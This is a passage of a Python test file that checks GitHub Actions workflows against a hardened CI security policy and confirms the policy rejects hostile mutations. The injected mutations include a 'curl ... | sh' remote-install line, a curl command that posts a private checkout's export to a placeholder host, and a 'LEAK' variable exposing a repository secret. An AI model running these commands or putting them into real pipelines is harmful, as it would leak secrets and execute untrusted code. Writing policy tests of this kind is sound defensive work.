        (2, "uses", "astral-sh/setup-uv@v5"),
        (3, "run", "curl https://example.invalid/install | sh"),
        (6, "run", "uvx ruff check ."),
    ],
)
def test_untrusted_ci_policy_rejects_security_mutations(
    step_index: int, field: str, value: str
) -> None:
    workflow = copy.deepcopy(_workflow("ci.yml"))
    jobs = workflow["jobs"]
    assert isinstance(jobs, dict)
    job = jobs["test"]
    assert isinstance(job, dict)
    steps = job["steps"]
    assert isinstance(steps, list)
    steps[step_index][field] = value

    with pytest.raises(AssertionError):
        _assert_untrusted_ci_security(workflow)


@pytest.mark.parametrize(
    ("field", "value"),
    [
        ("on", {"push": "", "pull_request": {"paths": ["src/**"]}}),
        ("permissions", {"contents": "write"}),
        ("env", {"LEAK": "${{ secrets.DATASET_OPS_TOKEN }}"}),
        ("defaults", {"run": {"shell": "bash"}}),
    ],
)
def test_untrusted_ci_policy_rejects_boundary_mutations(
    field: str, value: object
) -> None:
    workflow = copy.deepcopy(_workflow("ci.yml"))
    workflow[field] = value

    with pytest.raises(AssertionError):
        _assert_untrusted_ci_security(workflow)


def test_untrusted_ci_policy_rejects_extra_job() -> None:
    workflow = copy.deepcopy(_workflow("ci.yml"))
    jobs = workflow["jobs"]
    assert isinstance(jobs, dict)
    jobs["exfiltrate"] = {"runs-on": "ubuntu-latest", "steps": []}

    with pytest.raises(AssertionError):
        _assert_untrusted_ci_security(workflow)


@pytest.mark.parametrize(
    ("field", "value"),
    [
        ("continue-on-error", "true"),
        ("if", "false"),
        ("runs-on", "self-hosted"),
        ("env", {"LEAK": "${{ secrets.DATASET_OPS_TOKEN }}"}),
    ],
)
def test_untrusted_ci_policy_rejects_job_mutations(
    field: str, value: object
) -> None:
    workflow = copy.deepcopy(_workflow("ci.yml"))
    jobs = workflow["jobs"]
    assert isinstance(jobs, dict)
    job = jobs["test"]
    assert isinstance(job, dict)
    job[field] = value

    with pytest.raises(AssertionError):
        _assert_untrusted_ci_security(workflow)


def _assert_trusted_contract_drift_security(workflow: dict[str, object]) -> None:
    assert set(workflow) == {"jobs", "name", "on", "permissions"}
    events = workflow["on"]
    assert events == {
        "push": {
            "branches": ["main"],
            "paths": [
                "contracts/**",
                "tests/test_vendor_drift.py",
                ".github/workflows/contract-drift.yml",
            ],
        }
    }
    assert workflow["permissions"] == {"contents": "read"}

    jobs = workflow["jobs"]
    assert isinstance(jobs, dict)
    assert set(jobs) == {"verify"}
    verify = jobs["verify"]
    assert isinstance(verify, dict)
    assert set(verify) == {"env", "runs-on", "steps"}
    assert verify["runs-on"] == "ubuntu-latest"
    assert verify["env"] == {
        "DATASET_OPS_REQUIRED": "1",
        "DATASET_OPS_REPO": "${{ github.workspace }}/.dataset-ops",
    }
    steps = verify["steps"]
    assert isinstance(steps, list)
    assert steps == [
        {
            "uses": "actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
            "with": {"persist-credentials": "false"},
        },
        {
            "uses": "astral-sh/setup-uv@"
            "d4b2f3b6ecc6e67c4457f6d3e41ec42d3d0fcb86",
            "with": {"enable-cache": "false", "version": "0.11.27"},
        },
        {"run": "uv sync --frozen"},
        {
            "uses": "actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
            "with": {
                "repository": "SeniorAILab/eldercare-dataset-ops",
                "path": ".dataset-ops",
                "token": "${{ secrets.DATASET_OPS_TOKEN }}",
                "persist-credentials": "false",
                "fetch-depth": "1",
                "sparse-checkout": "ml/contracts\n",
                "sparse-checkout-cone-mode": "false",
            },
        },
        {
            "name": "Verify vendored contracts",
            "shell": "bash",
            "run": (
                "set +e\n"
                'uv run pytest -q tests/test_vendor_drift.py > "$RUNNER_TEMP/'
                'contract-drift.log" 2>&1\n'
                "status=$?\n"
                'rm -f -- "$RUNNER_TEMP/contract-drift.log"\n'
                "if (( status != 0 )); then\n"
                '  echo "::error::Vendored contract drift verification failed; '
                'details suppressed."\n'
                '  exit "$status"\n'
                "fi\n"
            ),
        },
        {
            "name": "Remove private checkout",
            "if": "always()",
            "shell": "bash",
            "run": (
                'rm -rf -- "${{ github.workspace }}/.dataset-ops"\n'
                'rm -f -- "$RUNNER_TEMP/contract-drift.log"\n'
            ),
        },
    ]


def test_trusted_contract_drift_workflow_is_non_persistent() -> None:
    workflow = _workflow("contract-drift.yml")
    _assert_trusted_contract_drift_security(workflow)

    serialized = yaml.safe_dump(workflow)
    assert "upload-artifact" not in serialized
    assert "actions/cache" not in serialized


@pytest.mark.parametrize(
    ("step_index", "field", "value"),
    [
        (0, "uses", "actions/checkout@v4"),
        (1, "uses", "astral-sh/setup-uv@v5"),
        (4, "run", "curl https://example.invalid --data-binary @.dataset-ops/export"),
        (5, "if", "success()"),
    ],
)
def test_trusted_contract_policy_rejects_security_mutations(
    step_index: int, field: str, value: str
) -> None:
    workflow = copy.deepcopy(_workflow("contract-drift.yml"))
    jobs = workflow["jobs"]
    assert isinstance(jobs, dict)
    job = jobs["verify"]
    assert isinstance(job, dict)
    steps = job["steps"]
    assert isinstance(steps, list)
    steps[step_index][field] = value

    with pytest.raises(AssertionError):
        _assert_trusted_contract_drift_security(workflow)


@pytest.mark.parametrize(
    ("field", "value"),
    [
        ("continue-on-error", "true"),
        ("if", "false"),
        ("runs-on", "self-hosted"),
        ("container", "unreviewed/image:latest"),
    ],
)
def test_trusted_contract_policy_rejects_job_mutations(
    field: str, value: object
) -> None:
    workflow = copy.deepcopy(_workflow("contract-drift.yml"))
    jobs = workflow["jobs"]
    assert isinstance(jobs, dict)
    job = jobs["verify"]
    assert isinstance(job, dict)
    job[field] = value

    with pytest.raises(AssertionError):
        _assert_trusted_contract_drift_security(workflow)


@pytest.mark.parametrize(
    ("field", "value"),
    [
        ("DATASET_OPS_REQUIRED", "0"),
        ("DATASET_OPS_REPO", "/tmp/redirected"),
    ],
)
def test_trusted_contract_policy_rejects_environment_mutations(
    field: str, value: str
) -> None:
    workflow = copy.deepcopy(_workflow("contract-drift.yml"))
    jobs = workflow["jobs"]
    assert isinstance(jobs, dict)
    job = jobs["verify"]
    assert isinstance(job, dict)
    environment = job["env"]
    assert isinstance(environment, dict)
    environment[field] = value

    with pytest.raises(AssertionError):
        _assert_trusted_contract_drift_security(workflow)
